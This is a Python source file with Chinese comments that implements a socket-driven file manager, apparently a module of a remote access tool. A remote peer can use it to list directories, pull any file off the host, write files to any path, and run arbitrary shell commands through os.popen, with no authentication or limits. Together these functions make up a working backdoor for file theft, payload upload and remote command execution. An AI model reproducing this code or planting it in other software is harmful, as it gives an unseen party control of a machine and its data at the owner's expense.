# -*- coding: utf-8 -*-
import os


async def serverFileManager(GUI, writer, reader, operation):
    if operation == "fileList":
        writer.write("getOperation".encode())
        await writer.drain()
        # GUI.log_message(f"[*] 浏览文件夹")
        serverPath = await reader.read(1024)
        # GUI.log_message(f"[*] 路径: {serverPath.decode()}")
        try:
            fileList = os.listdir(serverPath.decode())
            fileList = " ".join(fileList)
            writer.write(f"{fileList}".encode())
            await writer.drain()
        except Exception as e:
            writer.write(f"错误: {e}".encode())
            await writer.drain()

    elif operation == "fileDownload":
        writer.write("getOperation".encode())
        await writer.drain()
        # GUI.log_message(f"[*] 下载文件")
        serverPath = await reader.read(1024)
        # GUI.log_message(f"[*] 将{serverPath.decode()}")
        writer.write("getServerPath".encode())
        await writer.drain()
        clientPath = await reader.read(1024)
        # GUI.log_message(f"[*] 发送到{clientPath.decode()}")

        with open(serverPath, "rb") as file:
            # 拆分发送
            while True:
                data = file.read(1024)
                if not data:
                    writer.write(b"EOFGrayJimars")
                    await writer.drain()
                    break
                writer.write(data)
                await writer.drain()
        # GUI.log_message(f"[*] 发送完成")

    elif operation == "fileUpload":
        writer.write("getOperation".encode())
        await writer.drain()
        # GUI.log_message(f"[*] 上传文件")
        clientPath = await reader.read(1024)
        # GUI.log_message(f"[*] 将{clientPath.decode()}")
        writer.write("getClientPath".encode())
        await writer.drain()
        serverPath = await reader.read(1024)
        # GUI.log_message(f"[*] 下载到{serverPath.decode()}")
        writer.write("getServerPath".encode())
        await writer.drain()

        with open(serverPath, "wb") as file:
            while True:
                data = await reader.read(1024)
                if data.endswith(b"EOFGrayJimars"):
                    # 去掉结尾的EOF并写入文件
                    file.write(data[:-13])
                    break
                file.write(data)
        # GUI.log_message(f"[*] 下载完成")

    elif operation == "fileExcute":
        writer.write("getOperation".encode())
        await writer.drain()
        # GUI.log_message(f"[*] 执行文件")
        serverPath = await reader.read(1024)
        # GUI.log_message(f"[*] 执行{serverPath.decode()}")
        # 执行并获得返回结果
        try:
            result = os.popen(serverPath.decode()).read()
            writer.write(f"{result}".encode())
            await writer.drain()
        except Exception as e:
            writer.write(f"错误: {e}".encode())
            await writer.drain()

    return
